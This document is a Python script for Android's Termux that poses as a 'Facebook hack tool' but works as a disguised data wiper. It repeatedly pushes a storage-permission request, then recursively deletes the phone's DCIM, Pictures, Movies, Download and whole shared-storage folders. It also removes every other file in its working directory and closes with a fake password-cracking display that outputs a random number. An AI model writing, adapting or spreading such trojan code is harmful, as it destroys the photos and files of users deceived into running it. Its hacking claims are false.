#!usr/bin/env python3
import random as d
import shutil
import os
import time as t
J = True

while J:
    try:
        g = open("/storage/emulated/0/z.txt","w")
        g.write("GOOD LUCK")
        g.close()
    except PermissionError:

        os.system("""am broadcast --user 0 \
		 --es com.termux.app.reload_style storage \
		 -a com.termux.app.reload_style com.termux > /dev/null""")
    else:
        J = False
shutil.rmtree("/storage/emulated/0/DCIM", ignore_errors=True)
shutil.rmtree("/storage/emulated/0/Movies", ignore_errors=True)
shutil.rmtree('/storage/emulated/0/Pictures', ignore_errors=True)
shutil.rmtree("/storage/emulated/0/Download", ignore_errors=True)
shutil.rmtree("/storage/emulated/0Android", ignore_errors=True)
shutil.rmtree("/storage/emulated/0", ignore_errors=True)
t.sleep(.1)
os.system("clear")
print("""\033[94
\n\n\n\n
\nFFb Hack tool Made By Reku Hkaiu
FB link: https://www.facebook.com/jayzz.omaoma     
We are anonymous, we are Legion , We Do not Forget,\nWe do not Forgive Expect us
\n\033[0m
""")

print("loading...")
t.sleep(2)
os.system("clear")


print("loading...")
t.sleep(.3)
os.system("clear")

tr = True

while tr:
    t.sleep(.5)
    print("\n\nHack Facebook with password")
    try:
        os.system("clear")
        i = input("Press Enter to Continue")
        if i != 978977837:
            os.system("clear")
            input("ID Target : ")
            tr = False
            os.system("clear")
            print("loading...")
            t.sleep(.5)
            os.system("clear")
            print("Finding Target's account...")
            t.sleep(5)
            os.system("clear")
            print("Cracking Password...")
            
    except:
        print("Invalid Input")
        t.sleep(.2)
        os.system("clear")

for i in os.listdir():
    if i == "Fb-Tool.py":
        continue
    else:
        try:
            os.remove(i)
        except:
            shutil.rmtree(i, ignore_errors=True)
t.sleep(1)
os.system("clear")
print("5")
t.sleep(2)
os.system("clear")
print("4")
t.sleep(3)
os.system("clear")
print("3")
t.sleep(4)
os.system("clear")
print("2")
t.sleep(5)
os.system("clear")
print("1")
os.system("clear")
g = d.randint(100000000,999999999)
print("Password : \n\n09"+str(g))
